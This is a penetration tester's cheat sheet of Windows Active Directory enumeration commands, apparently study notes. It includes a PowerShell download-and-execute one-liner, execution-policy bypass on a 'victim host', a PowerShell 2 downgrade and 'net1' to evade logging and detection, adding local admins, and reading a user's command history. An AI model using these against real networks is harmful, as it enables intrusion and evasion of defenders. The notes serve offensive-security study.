---
title: AD Enumeration (LOTL)
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
- Host and Network Recon:
```powershell
PS> systeminfo (enumerate all of the below information)

PS> hostname (Prints the PCs Name)
PS> [System.Environment]::OSVersion.Version (Prints out the OS version and revision level)
PS> wmic qfe get Caption,Description,HotFixID,InstalledOn (Prints the patches and hotfixes applied to the host)
cmd> echo %USERDOMAIN% (Displays the domain name to which the host belongs (ran from CMD-prompt))
PS> echo %logonserver% (Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt))
PS> qwinsta (check if someone is connected on the host)

+ NETWORK ENUMERATION +
PS> ipconfig /all (Prints out network adapter state and configurations)
cmd> set (Displays a list of environment variables for the current session (ran from CMD-prompt))
PS> netsh advfirewall show allprofiles (Displays the status of the hosts firewall. We can determine if it is active and filtering traffic.)

IMPORTANT FOR LATERAL MOVEMENT:
PS> arp -a (Lists all known hosts stored in the arp table)
PS> route print (Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host)
```

- PowerShell enumeration:
```powershell
PS> Get-Module (Lists available modules loaded for use.)
PS> Get-ExecutionPolicy -List (print the EP settings for each scope on a host)
PS> Set-ExecutionPolicy Bypass -Scope Process (change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. We wont be making a permanent change to the victim host)
PS> Get-ChildItem Env: | ft Key,Value (Return environment values such as key paths, users, computer information, etc)
PS> Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt (get the specified users PowerShell history)
PS> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" (download from web a file for file transfer)
```

- Downgrade PowerShell:
```powershell
PS> Get-Host (check current PS version)
PS> powershell.exe -version 2
PS> Get-Host (check downgrade on version field)
```

> [!Note]
> Powershell event logging was introduced as a feature with Powershell 3.0 and forward. We can downgrade the version using PowerShell 2

- Windows defenses enumeration:
```powershell
+ CHECK IF WINDOWS DEFENDER IS RUNNING +
PowerShell:
PS> netsh advfirewall show allprofiles

CMD: 
C:\> sc query windefend

+ CHECK STATUS AND CONFIG SETTINGS +
PS> Get-MpComputerStatus
```

- WMI:
```powershell
PS> wmic qfe get Caption,Description,HotFixID,InstalledOn (Prints the patch level and description of the Hotfixes applied)
PS> wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List (Displays basic host information to include any attributes within the list)
PS> wmic process list /format:list (list all processes on host)
PS> wmic ntdomain list /format:list (Displays information about the Domain and Domain Controllers)
PS> wmic useraccount list /format:list (Displays information about all local accounts and any domain accounts that have logged into the device)
PS> wmic group list /format:list (Information about all local groups)
PS> wmic sysaccount list /format:list (Dumps information about any system accounts that are being used as service accounts)
PS> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress (check info about the domain, child domain and external forests our current domain has trust with)
```

> [!Note]
> This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic

- Net:
```powershell
PS> net accounts (password requirements)
PS> net accounts /domain (Password and lockout policy)
PS> net group /domain (Information about domain groups)
PS> net group "Domain Admins" /domain (List users with domain admin privileges)
PS> net group "domain computers" /domain (List of PCs connected to the domain)
PS> net group "Domain Controllers" /domain (List PC accounts of domains controllers)
PS> net group <domain_group_name> /domain (User that belongs to the group)
PS> net groups /domain (List of domain groups)
PS> net localgroup (All available groups)
PS> net localgroup administrators /domain (List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default))
PS> net localgroup Administrators (Information about a group (admins))
PS> net localgroup administrators [username] /add (Add user to administrators)
PS> net share (Check current shares)
PS> net user <ACCOUNT_NAME> /domain (Get information about a user within the domain)
PS> net user /domain (List all users of the domain)
PS> net user %username% (Information about the current user)
PS> net use x: \computer\share (Mount the share locally)
PS> net view (Get a list of computers)
PS> net view /all /domain[:domainname] (Shares on the domains)
PS> net view \computer /ALL (List shares of a computer)
PS> net view /domain (List of PCs of the domain)
```

> [!Note]
> We can use the command `net1` instead of `net` with the same parameters to avoid detection

- Dsquery

> [!Requirements]
> - Elevated privileges on a host or the ability to run an instance of CMD or PowerShell from a SYSTEM context

```powershell
PS> dsquery user (user search)
PS> dsquery computer (computer search)
PS> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL" (wildcard search: view all objects in a OU)
PS> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl (looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute)
PS> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName (search for domain controlers -> limit to 5)
```

- LDAP Filtering: 
```powershell
Format:
<OIDC Match Strings>=<UAC Values>

UAC values:
1 -> Login script will execute
2 -> Account is disabled
32 -> Password not required
64 -> Password cant change
128 -> Encrypted text password allowed
512 -> Normal user account
2048 -> Interdomain trust account
4096 -> Domain Workstation or Member Server
8192 -> Domain Controller
65536 -> Password does not expire
524288 -> Trusted for impersonation
1048576 -> Account may not be impersonated

OIDC match strings:
1. `1.2.840.113556.1.4.803` -> must match completely (great for matching a single attribute)
2. `1.2.840.113556.1.4.804` -> if any bit in the chain matches (multiple attributes set)
3. `1.2.840.113556.1.4.1941` -> match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries
```

> [!Example]
> - `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))` -> the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change)
> - `(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))` -> search for any user object that does `NOT` have the Password Can't Change attribute set.

